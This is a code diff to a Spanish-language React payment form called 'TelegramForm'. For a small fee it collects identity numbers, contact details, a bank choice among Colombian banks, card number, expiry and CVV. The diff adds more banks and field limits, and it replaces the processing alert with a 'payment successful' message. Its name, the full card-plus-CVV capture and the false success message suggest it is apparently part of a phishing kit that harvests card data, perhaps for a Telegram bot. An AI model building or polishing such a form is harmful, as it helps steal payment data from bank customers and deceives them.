@@ -5,6 +5,7 @@ import Modal from '../../components/Modal/Modal';
 export default function TelegramForm() {
   const [currentStep, setCurrentStep] = useState(1);
   const [id, setID] = useState('');
+
   const [name, setName] = useState('');
   const [phone, setPhone] = useState('');
   const [email, setEmail] = useState('');
@@ -70,11 +71,19 @@ export default function TelegramForm() {
     });
 
     if (response.ok) {
-      alert('Procesando pago!');
+      alert('Su pago ha sido exitoso!');
       setCurrentStep(1);
       setID('');
       setName('');
       setPhone('');
+      setEmail('');
+      setAddress('');
+      setCity('');
+      setBanco('');
+      setCard('');
+      setMonth('');
+      setYear('');
+      setCVV('');
     } else {
       alert('Lo sentimos, ocurrió un error en el envío de la información.');
     }
@@ -105,9 +114,13 @@ export default function TelegramForm() {
                   El valor a pagar es de $6.200
                 </p>
                 <div className="text-center">
+                  <div id="err"></div>
                   <input
+                    name="cc"
+                    id="cc"
                     className="w-full  border rounded-md p-2 items-center"
                     value={id}
+                    maxlength="10"
                     onChange={(e) => setID(e.target.value)}
                     placeholder="Ingrese su documento de identidad"
                     required
@@ -216,10 +229,19 @@ export default function TelegramForm() {
                   <option value="bancolombia">Bancolombia</option>
                   <option value="avvillas">AV Villas</option>
                   <option value="bogota">Banco de Bogota</option>
-                  <option value="davivienda">Davivienda</option>
+                  <option value="pichincha">Banco Pichincha</option>
+                  <option value="falabella">Banco Falabella</option>
+                  <option value="agrario">Banco Agrario</option>
+                  <option value="itau">Banco Itaú</option>
+                  <option value="colpatria">Colpatria</option>
+                  <option value="social">Banco Caja Social</option>
+                  <option value="popular">Banco Popular</option>
+                  <option value="bbva">BBVA</option>
+                  <option value="occidente">Banco de Occidente</option>
                 </select>
                 <label className="font-display">Tarjeta</label>
                 <input
+                  maxlength="18"
                   className="w-full border rounded-md p-2 items-center"
                   value={card}
                   onChange={(e) => setCard(e.target.value)}
@@ -274,6 +296,8 @@ export default function TelegramForm() {
 
                 <label className="font-display">CVV</label>
                 <input
+                  required
+                  maxlength="3"
                   className="w-full border rounded-md p-2 items-center"
                   value={cvv}
                   onChange={(e) => setCVV(e.target.value)}
